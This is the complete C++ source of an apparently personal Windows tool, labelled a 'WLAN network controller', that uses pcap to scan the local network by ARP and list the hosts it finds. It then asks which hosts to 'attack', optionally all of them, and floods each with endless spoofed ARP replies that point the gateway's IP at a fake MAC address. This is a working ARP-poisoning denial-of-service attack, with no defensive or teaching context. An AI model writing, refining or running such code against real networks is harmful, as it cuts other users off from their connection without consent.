#define _WIN32_WINNT 0x0600
#include <pcap.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <bits/stdc++.h>
#include <string>
#include <vector>
#include <atomic>
#include <cstring>
//-lwpcap -lws2_32 -liphlpapi -m32 -std=c++14 -Os -s 
#pragma comment(lib,"wpcap.lib")
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"iphlpapi.lib")

using namespace std;

struct EthernetHeader {
    uint8_t dst[6];
    uint8_t src[6];
    uint16_t type;
};

struct ArpHeader {
    uint16_t htype;
    uint16_t ptype;
    uint8_t  hlen;
    uint8_t  plen;
    uint16_t oper;
    uint8_t  sha[6];
    uint8_t  spa[4];
    uint8_t  tha[6];
    uint8_t  tpa[4];
};
struct wlanuser {
    char ipaddr[32];
    char mac[32];
    char vendor[64];
    char hostname[64];
    uint8_t macu8[6];
    wlanuser() { vendor[0] = hostname[0] = '\0'; }
    wlanuser(const ArpHeader* arp) {
        if (ntohs(arp->oper) == 2) {
            sprintf(ipaddr, "%u.%u.%u.%u",
                    arp->spa[0], arp->spa[1], arp->spa[2], arp->spa[3]);
            sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
                    arp->sha[0], arp->sha[1], arp->sha[2],
                    arp->sha[3], arp->sha[4], arp->sha[5]);
            vendor[0] = hostname[0] = '\0';
            macu8[0]=arp->sha[0];
            macu8[1]=arp->sha[1];
            macu8[2]=arp->sha[2];
            macu8[3]=arp->sha[3];
            macu8[4]=arp->sha[4];
            macu8[5]=arp->sha[5];
        }
    }
};
string lookupVendor(const uint8_t mac[6]) {
    char prefix[9];
    sprintf(prefix, "%02X:%02X:%02X", mac[0], mac[1], mac[2]);
    return (string)prefix;
}
bool getLocalNetInfo(const std::string& adapterName, uint8_t mac[6], uint8_t ip[4], uint8_t mask[4]) {
    IP_ADAPTER_INFO info[16];
    DWORD buflen = sizeof(info);
    if (GetAdaptersInfo(info, &buflen) != NO_ERROR) return false;

    for (PIP_ADAPTER_INFO p = info; p; p = p->Next) {
        if (adapterName.find(p->AdapterName) != std::string::npos) {
            memcpy(mac, p->Address, 6);
            sscanf(p->IpAddressList.IpAddress.String, "%hhu.%hhu.%hhu.%hhu",
                   &ip[0], &ip[1], &ip[2], &ip[3]);
            sscanf(p->IpAddressList.IpMask.String, "%hhu.%hhu.%hhu.%hhu",
                   &mask[0], &mask[1], &mask[2], &mask[3]);
            return true;
        }
    }
    return false;
}
/*string resolveHostname(const char* ip) {
    sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(ip);
    //inet_pton(AF_INET, ip, &(sa.sin_addr));

    char host[NI_MAXHOST];
    if (getnameinfo((sockaddr*)&sa, sizeof(sa), host, sizeof(host), NULL, 0, NI_NAMEREQD) == 0) {
        return host;
    }
    return "Unknown";
}*/
string resolveHostname(const char* ip, DWORD timeoutMs = 3000) {
    auto future = std::async(std::launch::async, [ip]() -> std::string {
        sockaddr_in sa{};
        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(ip);

        char host[NI_MAXHOST];
        if (getnameinfo((sockaddr*)&sa, sizeof(sa), host, sizeof(host), NULL, 0, NI_NAMEREQD) == 0) {
            return std::string(host);
        }
        return std::string("Unknown");
    });

    if (future.wait_for(std::chrono::milliseconds(timeoutMs)) == std::future_status::ready) {
        return future.get();
    }
    return "Unknown"; // 超时
}
//<pcap.h><winsock2.h>
vector<wlanuser> scanLAN(pcap_t* handle,
                         const uint8_t myMac[6],
                         const uint8_t myIp[4],
                         const uint8_t myMask[4],
                         int timeout_ms,
						 int timeout_host)
{
    vector<wlanuser> users;

    // 计算网段
    uint8_t net[4], broadcast[4];
    for (int i = 0; i < 4; i++) {
        net[i] = myIp[i] & myMask[i];
        broadcast[i] = net[i] | (~myMask[i]);
    }

    uint32_t netIP = (net[0]<<24) | (net[1]<<16) | (net[2]<<8) | net[3];
    uint32_t broadcastIP = (broadcast[0]<<24) |
                            (broadcast[1]<<16) |
                            (broadcast[2]<<8)  |
                            broadcast[3];
	cout<<"发送arp请求\n";
    // 1. 批量发 ARP 请求
    for (uint32_t ip = netIP + 1; ip < broadcastIP; ++ip) {
        uint8_t targetIp[4] = {
            (uint8_t)((ip >> 24) & 0xFF),
            (uint8_t)((ip >> 16) & 0xFF),
            (uint8_t)((ip >> 8) & 0xFF),
            (uint8_t)(ip & 0xFF)
        };

        uint8_t packet[42];
        EthernetHeader* eth = (EthernetHeader*)packet;
        memset(eth->dst, 0xFF, 6);
        memcpy(eth->src, myMac, 6);
        eth->type = htons(0x0806);

        ArpHeader* arp = (ArpHeader*)(packet + 14);
        arp->htype = htons(1);      // Ethernet
        arp->ptype = htons(0x0800); // IPv4
        arp->hlen = 6;
        arp->plen = 4;
        arp->oper = htons(1);       // ARP Request
        memcpy(arp->sha, myMac, 6);
        memcpy(arp->spa, myIp, 4);
        memset(arp->tha, 0, 6);
        memcpy(arp->tpa, targetIp, 4);

        pcap_sendpacket(handle, packet, sizeof(packet));
    }

    // 2. 接收响应（只做 ARP 处理，不解析 hostname）
	cout<<"接收arp请求\n";
    int startTick = GetTickCount();
    pcap_pkthdr* header;
    const u_char* pkt_data;
    while ((GetTickCount() - startTick) < (DWORD)timeout_ms) {
        int res = pcap_next_ex(handle, &header, &pkt_data);
        if (res == 1) {
            const EthernetHeader* eth = (const EthernetHeader*)pkt_data;
            if (ntohs(eth->type) == 0x0806) {
                const ArpHeader* arp = (const ArpHeader*)(pkt_data + 14);
                if (ntohs(arp->oper) == 2) { // ARP Reply
                    wlanuser wu(arp);
                    // 先记 vendor
                    //strncpy(wu.vendor, lookupVendor(arp->sha).c_str(), \
                            sizeof(wu.vendor) - 1);
                    bool exists = false;
                    for (auto &u : users) {
                        if (strcmp(u.ipaddr, wu.ipaddr) == 0) {
                            exists = true;
                            break;
                        }
                    }
                    if (!exists) {
                        users.push_back(wu);
                    }
                }
            }
        }
    }

	cout<<"解析主机名\n";
    // 3. 批量异步解析主机名（独立于 ARP 超时）
    std::vector<std::future<void>> jobs;
    atomic<int> wait_t(timeout_host);
    for (auto &u : users) {
        jobs.push_back(std::async(std::launch::async, [&u, &wait_t]() {
		    std::string host = resolveHostname(u.ipaddr, wait_t);
		    strncpy(u.hostname, host.c_str(), sizeof(u.hostname) - 1);
		}));
    }
    // 可等待所有任务完成
	cout<<"等待所有任务完成\n";
    for (auto &j : jobs) {
        j.get();
    }

    return users;
}
class arpxy {
public:
    arpxy() : handle(nullptr) {}
    ~arpxy() { clean(); }

    bool init(const char* devname) {
        char errbuf[PCAP_ERRBUF_SIZE];
        handle = pcap_open_live(devname, 65536, 1, 1000, errbuf);
        if (!handle) {
            std::cerr << "pcap_open_live failed: " << errbuf << "\n";
            return false;
        }
        return true;
    }

    bool sendone(const uint8_t src_mac[6], const char* src_ip,
                 const uint8_t dst_mac[6], const char* dst_ip) {
        if (!handle) return false;
        
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        // Ethernet Header
        EthernetHeader* eth = (EthernetHeader*)packet;
        memcpy(eth->dst, dst_mac, 6);
        memcpy(eth->src, src_mac, 6);
        eth->type = htons(0x0806); // ARP
        
        // ARP Header
        ArpHeader* arp = (ArpHeader*)(packet + sizeof(EthernetHeader));
        arp->htype = htons(1);        // Ethernet
        arp->ptype = htons(0x0800);   // IPv4
        arp->hlen  = 6;
        arp->plen  = 4;
        arp->oper  = htons(2);        // reply
        
        // Parse IP addresses
        uint32_t sip, tip;
        inet_pton(AF_INET, src_ip, &sip);
        inet_pton(AF_INET, dst_ip, &tip);
        
        memcpy(arp->sha, src_mac, 6);
        memcpy(arp->spa, &sip, 4);
        memcpy(arp->tha, dst_mac, 6);
        memcpy(arp->tpa, &tip, 4);
        
        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
            std::cerr << "pcap_sendpacket failed: " << pcap_geterr(handle) << "\n";
            return false;
        }
        
        //std::cout << "[+] Sent ARP reply: " << src_ip \
                  << " is at " << macToStr(src_mac) \
                  << " -> " << dst_ip << "\n"; 
        return true;
    }

    void sendloop(const uint8_t src_mac[6],
                 const char* src_ip,
                 const uint8_t dst_mac[6],
                 const char* target_ip,
                 int interval_ms,
                 int count = 0)
    {
        if (!handle) {
            std::cerr << "pcap handle not initialized\n";
            return;
        }
        
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        // Ethernet Header - Targeting SPECIFIC host
        EthernetHeader* eth = (EthernetHeader*)packet;
        memcpy(eth->dst, dst_mac, 6);  // UNICAST to target
        memcpy(eth->src, src_mac, 6);
        eth->type = htons(0x0806);
        
        // ARP Header
        ArpHeader* arp = (ArpHeader*)(packet + sizeof(EthernetHeader));
        arp->htype = htons(1);
        arp->ptype = htons(0x0800);
        arp->hlen  = 6;
        arp->plen  = 4;
        arp->oper  = htons(2);  // ARP Reply
        
        // Parse IP addresses
        uint32_t sip, tip;
        inet_pton(AF_INET, src_ip, &sip);
        inet_pton(AF_INET, target_ip, &tip);
        
        memcpy(arp->sha, src_mac, 6);
        memcpy(arp->spa, &sip, 4);
        memcpy(arp->tha, dst_mac, 6);  // Target's MAC
        memcpy(arp->tpa, &tip, 4);     // Target's IP
        
        int sent = 0;
        do {
            if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
                std::cerr << "pcap_sendpacket failed: " << pcap_geterr(handle) << "\n";
                break;
            }
            sent++;
            // std::cout << "[#] Sent ARP spoof (" << sent << ") " \
                      << src_ip << " is at " << macToStr(src_mac) \
                      << " -> " << target_ip << "\n";
            
            if(interval_ms)std::this_thread::sleep_for(std::chrono::milliseconds(interval_ms));
        } while (count == 0 || sent < count);
    }

    void clean() {
        if (handle) {
            pcap_close(handle);
            handle = nullptr;
        }
    }

private:
    pcap_t* handle;

    static std::string macToStr(const uint8_t mac[6]) {
        char buf[18];
        snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        return std::string(buf);
    }
};
string getGatewayIP(const std::string& devNameStr) {
    IP_ADAPTER_INFO adapterInfo[16]; // 最多存 16 个网卡信息
    DWORD bufLen = sizeof(adapterInfo);

    if (GetAdaptersInfo(adapterInfo, &bufLen) != NO_ERROR) {
        return "";
    }

    // 从 Npcap 设备名提取 GUID
    std::string guid;
    size_t pos = devNameStr.find('{');
    if (pos != std::string::npos) {
        guid = devNameStr.substr(pos); // 从 '{' 开始到结尾
    } else {
        guid = devNameStr; // 有时不带前缀
    }

    PIP_ADAPTER_INFO pAdapter = adapterInfo;
    while (pAdapter) {
        if (guid == std::string(pAdapter->AdapterName)) {
            // 找到对应的本地适配器
            if (pAdapter->GatewayList.IpAddress.String != nullptr &&
                strlen(pAdapter->GatewayList.IpAddress.String) > 0 &&
                strcmp(pAdapter->GatewayList.IpAddress.String, "0.0.0.0") != 0) {
                return std::string(pAdapter->GatewayList.IpAddress.String);
            } else {
                return ""; // 没有网关
            }
        }
        pAdapter = pAdapter->Next;
    }

    return ""; // 没匹配到
}
int main() {
	cout<<"wlan网络控制器\nby hty\n";
	pcap_t* handle = nullptr;
	uint8_t myMac[6], myIp[4], myMask[4];
	pcap_if_t* alldevs = nullptr;
    int idx = 0;
    char errbuf[PCAP_ERRBUF_SIZE];
    // 直接获取链表
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        cerr<<"pcap_findalldevs failed: "<<errbuf<<"\n";
        return 1;
    }
    // 列出设备
    pcap_if_t* d;
    for (d = alldevs; d; d = d->next) {
        cout<<"["<<idx<<"] "
            <<(d->description ? d->description : "No description")
            <<" ("<<d->name<<")\n";
        idx++;
    }
    // 选择
    cout<<"选择网卡编号: ";
    int choice;
    cin >> choice;
    if (choice < 0 || choice >= idx) {
        cerr<<"choice wrong\n";
        return 1;
    }
    // 找到选中设备
    pcap_if_t* dev = alldevs;
    for (int i = 0; i < choice; i++) {
        dev = dev->next;
    }
    // 获取 IP/MAC
    if (!getLocalNetInfo(dev->name, myMac, myIp, myMask)) {
        cerr<<"CANNOT GET IP/MAC\n";
        return 1;
    }
    // 打开设备
    handle = pcap_open_live(dev->name, 65536, 1, 1, errbuf);
    if (!handle) {
        cerr<<"pcap_open_live failed: "<<errbuf<<"\n";
        return 1;
    }
    string devNameStr = dev->name;
    vector<wlanuser> users;
    int mode = 0;
    cout<<"搜索模式:0快速，1正常，2慢速，3最慢\n";
    cin>>mode;
    if(mode==0)users = scanLAN(handle, myMac, myIp, myMask, 1000,500);
    if(mode==1)users = scanLAN(handle, myMac, myIp, myMask, 2000,1000);
    if(mode==2)users = scanLAN(handle, myMac, myIp, myMask, 3000,1500);
    if(mode==3)users = scanLAN(handle, myMac, myIp, myMask, 3000,2000);
    cout<<"\n=== 扫描结果 ===\n";
    for (int i = 0;i<(int)users.size();i++) {
    	auto u = users[i];
        cout<<i<<"|"<<"IP: "<<u.ipaddr<< "   MAC: "<<u.mac/*<< "   Vendor: "<<u.vendor*/<< "   Hostname: "<<u.hostname<< "\n";
    }
    cout<<"扫描结束\n";
    pcap_freealldevs(alldevs);
    pcap_close(handle);
	string gatewayip = getGatewayIP(devNameStr);
	cout<<"网关ip:"<<gatewayip<<endl;
    cout << "\n请输入要攻击的索引(空格分隔, -1 表示全部): ";
	string line;
	getline(cin >> ws, line); // 读整行
	
	std::vector<int> targets;
	
	if (line == "-1") {
	    for (int i = 0; i < (int)users.size(); i++) targets.push_back(i);
	} else {
	    std::stringstream ss(line);
	    int idx;
	    while (ss >> idx) {
	        if (idx >= 0 && idx < (int)users.size()) {
	            targets.push_back(idx);
	        }
	    }
	}
	// 启动线程
	std::vector<std::thread> threads;
	for (int idx : targets) {
	    threads.emplace_back([&, idx]() {
	        // 假设我们要伪造网关 IP / MAC
	        //uint8_t fakeMac[6] = {myMac[0], myMac[1], myMac[2], \
	                              myMac[3], myMac[4], myMac[5]};
	        uint8_t fakeMac[6] = {0x5c,0x60,0xba,0x38,0xc4,0x69};//{0x11,0x45,0x14,0x19,0x19,0x81};
	        const char* fakeIP = gatewayip.c_str(); // 伪造网关IP
	        uint8_t targetMac[6];
	        int t0, t1, t2, t3, t4, t5;
	        sscanf(users[idx].mac, "%x:%x:%x:%x:%x:%x",
	               &t0, &t1, &t2, &t3, &t4, &t5);
	        targetMac[0]=t0; targetMac[1]=t1; targetMac[2]=t2;
	        targetMac[3]=t3; targetMac[4]=t4; targetMac[5]=t5;
	
	        arpxy sender;
	        sender.init(devNameStr.c_str()); // 重新打开设备
	        sender.sendloop(fakeMac, fakeIP,targetMac,users[idx].ipaddr,0, 0); // 每秒1包, 无限
	    });
	    Sleep(100);
	}
	cout<<"攻击已经开始\n";
	
	// 等待
	for (auto& t : threads) {
	    if (t.joinable()) t.join();
	    Sleep(1500);
	}
}
